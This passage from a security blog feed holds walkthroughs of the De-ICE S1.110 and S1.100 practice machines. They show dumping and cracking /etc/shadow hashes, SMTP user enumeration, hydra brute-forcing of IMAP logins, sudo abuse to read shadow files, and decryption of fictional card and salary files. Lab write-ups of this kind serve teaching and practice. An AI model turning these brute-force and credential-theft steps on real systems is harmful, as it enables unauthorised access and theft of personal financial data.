</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:&lt;em>:9797:0:::::daemon:&lt;/em>:9797:0:::::adm:&lt;em>:9797:0:::::lp:&lt;/em>:9797:0:::::sync:&lt;em>:9797:0:::::shutdown:&lt;/em>:9797:0:::::halt:&lt;em>:9797:0:::::mail:&lt;/em>:9797:0:::::&lt;a href="news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::">news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>After adjusting:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
</span><span class='line'>bin:&lt;em>:9797:0:::::
</span><span class='line'>daemon:&lt;/em>:9797:0:::::
</span><span class='line'>adm:&lt;em>:9797:0:::::
</span><span class='line'>lp:&lt;/em>:9797:0:::::
</span><span class='line'>sync:&lt;em>:9797:0:::::
</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
</span><span class='line'>halt:&lt;em>:9797:0:::::
</span><span class='line'>mail:&lt;/em>:9797:0:::::
</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
</span><span class='line'>uucp:&lt;em>:9797:0:::::
</span><span class='line'>operator:&lt;/em>:9797:0:::::
</span><span class='line'>games:&lt;em>:9797:0:::::
</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
</span><span class='line'>mysql:&lt;em>:9797:0:::::
</span><span class='line'>rpc:&lt;/em>:9797:0:::::
</span><span class='line'>sshd:&lt;em>:9797:0:::::
</span><span class='line'>gdm:&lt;/em>:9797:0:::::
</span><span class='line'>pop:&lt;em>:9797:0:::::
</span><span class='line'>nobody:&lt;/em>:9797:0:::::
</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john &ndash;wordlist=&ldquo;/root/darkc0de.lst&rdquo;
</span><span class='line'>Complexity       (root)
</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure></p>

<p>We log in as user bbanter and obtain root permissions:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
</span><span class='line'>Password: **********
</span><span class='line'>root@slax:/# id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure></p>

<p>Lastly, we check the backup file and decrypt CSV:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/sh&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;encrypt files in ftp/incoming&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;remove old file&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;rm /home/ftp/incoming/<span class="nv">$1</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
</span><span class='line'>&ldquo;CustomerID&rdquo;,&ldquo;CustomerName&rdquo;,&ldquo;CCType&rdquo;,&ldquo;AccountNo&rdquo;,&ldquo;ExpDate&rdquo;,&ldquo;DelMethod&rdquo;
</span><span class='line'>1002,&ldquo;Mozart Exercise Balls Corp.&rdquo;,&ldquo;VISA&rdquo;,&ldquo;2412225132153211&rdquo;,&ldquo;11/09&rdquo;,&ldquo;SHIP&rdquo;
</span><span class='line'>1003,&ldquo;Brahms 4-Hands Pianos&rdquo;,&ldquo;MC&rdquo;,&ldquo;3513151542522415&rdquo;,&ldquo;07/08&rdquo;,&ldquo;SHIP&rdquo;
</span><span class='line'>1004,&ldquo;Strauss Blue River Drinks&rdquo;,&ldquo;MC&rdquo;,&ldquo;2514351522413214&rdquo;,&ldquo;02/08&rdquo;,&ldquo;PICKUP&rdquo;
</span><span class='line'>1005,&ldquo;Beethoven Hearing-Aid Corp.&rdquo;,&ldquo;VISA&rdquo;,&ldquo;5126391235199246&rdquo;,&ldquo;09/09&rdquo;,&ldquo;SHIP&rdquo;
</span><span class='line'>1006,&ldquo;Mendelssohn Wedding Dresses&rdquo;,&ldquo;MC&rdquo;,&ldquo;6147032541326464&rdquo;,&ldquo;01/10&rdquo;,&ldquo;PICKUP&rdquo;
</span><span class='line'>1007,&ldquo;Tchaikovsky Nut Importer and Supplies&rdquo;,&ldquo;VISA&rdquo;,&ldquo;4123214145321524&rdquo;,&ldquo;05/08&rdquo;,&ldquo;SHIP&rdquo;</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.100]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/09/de-ice-s1-dot-100/"/>
    <updated>2015-05-09T20:55:07+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/09/de-ice-s1-dot-100</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1100,8/">De-ICE: S1.100</a></p>

<p>The output from nmap:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
</span><span class='line'>20/tcp  closed ftp-data
</span><span class='line'>21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
</span><span class='line'>443/tcp closed https
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>We connect to the web site and save the staff names to the file:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat names.txt
</span><span class='line'>Marie Mary
</span><span class='line'>Pat Patrick
</span><span class='line'>Terry Thompson
</span><span class='line'>Ben Benedict
</span><span class='line'>Erin Gennieg
</span><span class='line'>Paul Michael
</span><span class='line'>Ester Long
</span><span class='line'>Adam Adams
</span><span class='line'>Bob Banter
</span><span class='line'>Chad Coffee</span></code></pre></td></tr></table></div></figure></p>

<p>Using this script <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/865a89c2db01c2a5589c534b7f56d1669dddf0ab/namemash.py">namemash.py</a>
we generate the potential login names:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat userlist.txt
</span><span class='line'>mariemary
</span><span class='line'>marymarie
</span><span class='line'>marie.mary
</span><span class='line'>mary.marie
</span><span class='line'>marym
</span><span class='line'>mmary
</span><span class='line'>mmarie
</span><span class='line'>m.mary
</span><span class='line'>m.marie
</span><span class='line'>marie
</span><span class='line'>mary
</span><span class='line'>patpatrick
</span><span class='line'>patrickpat
</span><span class='line'>pat.patrick
</span><span class='line'>patrick.pat
</span><span class='line'>patrickp
</span><span class='line'>ppatrick
</span><span class='line'>ppat
</span><span class='line'>p.patrick
</span><span class='line'>p.pat
</span><span class='line'>pat
</span><span class='line'>patrick
</span><span class='line'>terrythompson
</span><span class='line'>thompsonterry
</span><span class='line'>terry.thompson
</span><span class='line'>thompson.terry
</span><span class='line'>thompsont
</span><span class='line'>tthompson
</span><span class='line'>tterry
</span><span class='line'>t.thompson
</span><span class='line'>t.terry
</span><span class='line'>terry
</span><span class='line'>thompson
</span><span class='line'>benbenedict
</span><span class='line'>benedictben
</span><span class='line'>ben.benedict
</span><span class='line'>benedict.ben
</span><span class='line'>benedictb
</span><span class='line'>bbenedict
</span><span class='line'>bben
</span><span class='line'>b.benedict
</span><span class='line'>b.ben
</span><span class='line'>ben
</span><span class='line'>benedict
</span><span class='line'>eringennieg
</span><span class='line'>genniegerin
</span><span class='line'>erin.gennieg
</span><span class='line'>gennieg.erin
</span><span class='line'>genniege
</span><span class='line'>egennieg
</span><span class='line'>gerin
</span><span class='line'>e.gennieg
</span><span class='line'>g.erin
</span><span class='line'>erin
</span><span class='line'>gennieg
</span><span class='line'>paulmichael
</span><span class='line'>michaelpaul
</span><span class='line'>paul.michael
</span><span class='line'>michael.paul
</span><span class='line'>michaelp
</span><span class='line'>pmichael
</span><span class='line'>mpaul
</span><span class='line'>p.michael
</span><span class='line'>m.paul
</span><span class='line'>paul
</span><span class='line'>michael
</span><span class='line'>esterlong
</span><span class='line'>longester
</span><span class='line'>ester.long
</span><span class='line'>long.ester
</span><span class='line'>longe
</span><span class='line'>elong
</span><span class='line'>lester
</span><span class='line'>e.long
</span><span class='line'>l.ester
</span><span class='line'>ester
</span><span class='line'>long
</span><span class='line'>adamadams
</span><span class='line'>adamsadam
</span><span class='line'>adam.adams
</span><span class='line'>adams.adam
</span><span class='line'>adamsa
</span><span class='line'>aadams
</span><span class='line'>aadam
</span><span class='line'>a.adams
</span><span class='line'>a.adam
</span><span class='line'>adam
</span><span class='line'>adams
</span><span class='line'>bobbanter
</span><span class='line'>banterbob
</span><span class='line'>bob.banter
</span><span class='line'>banter.bob
</span><span class='line'>banterb
</span><span class='line'>bbanter
</span><span class='line'>bbob
</span><span class='line'>b.banter
</span><span class='line'>b.bob
</span><span class='line'>bob
</span><span class='line'>banter
</span><span class='line'>chadcoffee
</span><span class='line'>coffeechad
</span><span class='line'>chad.coffee
</span><span class='line'>coffee.chad
</span><span class='line'>coffeec
</span><span class='line'>ccoffee
</span><span class='line'>cchad
</span><span class='line'>c.coffee
</span><span class='line'>c.chad
</span><span class='line'>chad
</span><span class='line'>coffee</span></code></pre></td></tr></table></div></figure></p>

<p>In this case, the better way should be to use SMTP enumeration:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#97;&#64;&#115;&#x6c;&#x61;&#x78;&#x2e;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#x6e;&#101;&#116;">&#x61;&#64;&#115;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#110;&#x65;&#x74;&lt;/a>
</span><span class='line'>250 2.1.0 &lt;a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x61;&#64;&#115;&#108;&#97;&#120;&#x2e;&#101;&#120;&#97;&#109;&#112;&#108;&#x65;&#46;&#x6e;&#x65;&#x74;&#x2e;&#x2e;&#x2e;">&#x61;&#64;&#x73;&#108;&#97;&#120;&#x2e;&#101;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#110;&#101;&#x74;&#46;&#46;&#46;&lt;/a> Sender ok
</span><span class='line'>rcpt to: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x62;&#x62;&#x61;&#110;&#x74;&#101;&#x72;&#64;&#x73;&#108;&#97;&#120;&#46;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#x2e;&#110;&#x65;&#x74;">&#x62;&#98;&#x61;&#110;&#x74;&#x65;&#114;&#64;&#x73;&#x6c;&#x61;&#120;&#46;&#101;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#116;&lt;/a>
</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x62;&#x62;&#97;&#x6e;&#116;&#x65;&#x72;&#x40;&#115;&#x6c;&#97;&#x78;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x6e;&#x65;&#116;&#x2e;&#x2e;&#46;">&#98;&#x62;&#x61;&#x6e;&#x74;&#101;&#x72;&#64;&#x73;&#x6c;&#97;&#120;&#x2e;&#x65;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#110;&#x65;&#116;&#46;&#46;&#x2e;&lt;/a> Recipient ok
</span><span class='line'>rcpt to: bbanter
</span><span class='line'>250 2.1.5 &lt;a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x62;&#98;&#97;&#110;&#x74;&#x65;&#x72;&#x40;&#x73;&#x6c;&#97;&#x78;&#x2e;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#110;&#x65;&#x74;&#x2e;&#46;&#x2e;">&#98;&#x62;&#97;&#110;&#116;&#x65;&#x72;&#x40;&#115;&#108;&#97;&#x78;&#46;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#101;&#116;&#x2e;&#x2e;&#x2e;&lt;/a> Recipient ok
</span><span class='line'>rcpt to: aadam
</span><span class='line'>550 5.1.1 aadam&hellip; User unknown
</span><span class='line'>rcpt to: aadams
</span><span class='line'>250 2.1.5 aadams&hellip; Recipient ok</span></code></pre></td></tr></table></div></figure></p>

<p>We use hydra to perform brute-force attack via imap service:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ hydra -L userlist.txt 192.168.1.100 imap -u -e nsr
</span><span class='line'>[143][imap] host: 192.168.1.100   login: bbanter   password: bbanter</span></code></pre></td></tr></table></div></figure></p>

<p>After login as bbanter, we download the /etc/passwd file to create more accurate wordlist:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat userlist2.txt
</span><span class='line'>aadams
</span><span class='line'>ccoffee</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ hydra -L userlist2.txt 192.168.1.100 imap -u -P /usr/share/wordlists/rockyou.txt
</span><span class='line'>[143][imap] host: 192.168.1.100   login: aadams   password: nostradamus</span></code></pre></td></tr></table></div></figure></p>

<p>We found no working exploit using <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester</a>.</p>

<p>User aadams is in the wheel group:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/passwd:
</span><span class='line'>aadams:x:1000:10:,,,:/home/aadams:/bin/bash
</span><span class='line'>/etc/group:
</span><span class='line'>wheel::10:root</span></code></pre></td></tr></table></div></figure></p>

<p>Checking sudo -l reveals how to get root hash:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
</span><span class='line'>User aadams may run the following commands on this host:
</span><span class='line'>    (root) NOEXEC: /bin/ls
</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
</span><span class='line'>    (root) NOEXEC: /usr/bin/more
</span><span class='line'>    (root) NOEXEC: !/usr/bin/su &lt;em>root&lt;/em>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>aadams@slax:/tmp$ sudo cat /etc/shadow
</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>

<p>Using John, we cracked these hashes:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tarot            (root)
</span><span class='line'>hierophant       (ccoffee)</span></code></pre></td></tr></table></div></figure></p>

<p>We find salary_dec2003.csv.enc in FTP directory and because there is suspicous
line in /etc/passwd (DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION), we
know that the password for this file could be the same as for root.</p>

<p>For this purpose, we wroted the following script:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat crack-openssl.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/usr/bin/env bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ciphers<span class="o">=</span>&lt;code&gt;openssl list-cipher-commands&lt;/code&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;for c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  openssl enc -d -<span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$c</span><span class="p">&amp;</span>rdquo<span class="p">;</span> -in salary_dec2003.csv.enc -k tarot -out csv/salary_dec2003.csv.<span class="nv">$c</span>-decrypted
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>In a few gibberish files we read csv/salary_dec2003.csv.aes-128-cbc-decrypted:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat csv/salary_dec2003.csv.aes-128-cbc-decrypted  | head -15
</span><span class='line'>,Employee information,,,,,,,,,,,,,,
</span><span class='line'>,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage
</span><span class='line'>),Total Taxes Withheld (Percentage),&ldquo;Insurance
</span><span class='line'>Deduction
</span><span class='line'>(Dollars)&rdquo;,&ldquo;Other Regular
</span><span class='line'>Deduction
</span><span class='line'>(Dollars)&rdquo;,&ldquo;Total Regular Deductions (Excluding taxes, in dollars)&rdquo;,&ldquo;Direct Deposit Info
</span><span class='line'>Routing Number&rdquo;,&ldquo;Direct Deposit Info
</span><span class='line'>Account Number&rdquo;
</span><span class='line'>,1,Charles E. Ophenia,&ldquo;$225,000.00&rdquo;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
</span><span class='line'>,2,Marie Mary,&ldquo;$56,000.00&rdquo;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
</span><span class='line'>,3,Pat Patrick,&ldquo;$43,350.00&rdquo;,1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
</span><span class='line'>,4,Terry Thompson,&ldquo;$27,500.00&rdquo;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
</span><span class='line'>,5,Ben Benedict,&ldquo;$29,750.00&rdquo;,1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
</span><span class='line'>,6,Erin Gennieg,&ldquo;$105,000.00&rdquo;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
</span><span class='line'>,7,Paul Michael,&ldquo;$76,000.00&rdquo;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
